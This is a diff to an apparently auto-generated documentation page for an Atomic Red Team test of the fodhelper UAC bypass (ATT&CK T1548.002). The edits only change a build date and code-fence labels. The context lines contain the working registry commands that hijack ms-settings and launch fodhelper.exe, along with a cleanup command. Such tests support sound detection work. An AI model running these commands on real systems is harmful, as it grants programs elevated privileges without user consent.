@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1548.002"
 attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "58f641ea-12e3-499a-b684-44dee46bd182"
@@ -51,7 +51,7 @@ Upon execution, "The operation completed successfully." will be shown twice and 
 
 ### Command
 
-```commandprompt
+```cmd
 reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
 reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
 fodhelper.exe
@@ -59,7 +59,7 @@ fodhelper.exe
 
 ### Cleanup
 
-```commandprompt
+```cmd
 reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
 ```
 
